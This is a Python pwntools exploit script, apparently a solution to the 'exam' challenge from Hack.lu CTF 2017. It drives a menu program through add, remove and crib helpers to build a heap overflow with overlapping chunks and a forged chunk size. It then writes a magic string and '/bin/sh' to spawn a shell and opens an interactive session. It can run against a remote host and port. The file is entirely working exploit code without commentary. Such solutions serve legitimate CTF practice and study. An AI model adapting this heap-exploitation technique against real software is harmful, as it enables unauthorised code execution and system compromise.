#!/usr/bin/env python

from pwn import *
import sys

def add(summary):
    r.sendlineafter("exam\n>", "1")
    r.sendlineafter(":-)\n>", summary)

def remove(idx):
    r.sendlineafter("exam\n>", "2")
    r.sendlineafter("remove?\n>", str(idx))

def study():
    r.sendlineafter("exam\n>", "3")

def createCrib():  
    r.sendlineafter("exam\n>", "4")

def tearCrib(): 
    r.sendlineafter("exam\n>", "5")

def gotoExam(idx):
    r.sendlineafter("exam\n>", "6")
    r.sendlineafter("it?\n>", str(idx))

def exploit(r):
    # allocate 3 chunks
    add("A"*0x20) # 0 
    add("B"*0x20) # 1
    add("C"*0x20) # 2
    add("D"*0x20) # 3

    remove(2) # free(C)

    #pause()
    payload  = "F"*(0x80-0x8)
    payload += p64(0x1b0)
    payload += "\x90"
    add(payload) # realloc(B)
    remove(0)
   
    remove(3)
    createCrib()
    payload  = "D"*0x58
    payload += "ITSMAGIC"
    payload += "/bin/sh"
    add(payload)
     
    gotoExam(1)

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/hackluctf17/exam/exam'], env={"LD_PRELOAD":""})
        r = process(['/home/vagrant/CTFs/hackluctf17/exam/exam'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
